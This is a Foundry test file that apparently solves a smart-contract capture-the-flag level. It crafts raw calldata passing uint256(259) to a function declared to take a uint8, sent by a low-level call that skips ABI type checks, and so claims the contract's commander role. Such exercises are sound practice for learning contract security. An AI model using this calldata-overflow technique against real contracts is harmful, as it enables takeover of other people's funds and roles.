//SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
import "forge-std/Test.sol";
import "../src/level30.sol";

contract HigherOrderTest is Test {
    HigherOrder public higherOrder;

    function setUp() public {
        higherOrder = new HigherOrder();
    }

    function testClaimLeadership82() public {
        // Correct selector: registerTreasury(uint8)
        bytes4 selector = bytes4(keccak256("registerTreasury(uint8)"));

        // Construct calldata: selector + full 32-byte-padded uint256(259)
        bytes memory payload = abi.encodePacked(selector, uint256(259));

        // Perform the low-level call to bypass ABI type checking
        (bool success, ) = address(higherOrder).call(payload);
        require(success, "registerTreasury call failed");

        // Call claimLeadership
        higherOrder.claimLeadership();

        // Validate commander is correctly assigned
        assertEq(higherOrder.commander(), address(this));
    }
}
